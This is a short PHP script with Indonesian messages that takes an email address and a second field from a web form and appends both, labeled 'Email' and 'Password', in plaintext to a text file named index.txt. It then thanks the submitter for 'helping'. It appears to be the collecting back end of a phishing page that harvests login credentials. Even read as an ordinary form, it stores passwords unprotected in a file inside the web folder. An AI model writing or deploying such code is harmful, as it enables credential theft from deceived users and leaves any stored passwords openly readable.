<?php
// Cek apakah form dikirim lewat metode POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = trim($_POST["email"]);
    $teks = trim($_POST["teks"]);

    // Validasi sederhana
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo "Format email tidak valid.";
        exit;
    }

    if (!preg_match("/^[A-Za-z0-9\s]+$/", $teks)) {
        echo "Teks hanya boleh berisi huruf, angka, dan spasi.";
        exit;
    }

    // Simpan ke file index.txt
    $baris = date("Y-m-d H:i:s") . " | Email: $email | Password: $teks" . PHP_EOL;
    file_put_contents("index.txt", $baris, FILE_APPEND | LOCK_EX);

    echo "<h1 align='center'>Trimakasih Telah Membantu</h1>";
    echo "<a href='index.html'><h2 align='center'>Kembali</h2></a>";
} else {
    echo "Akses tidak sah.";
}
?>
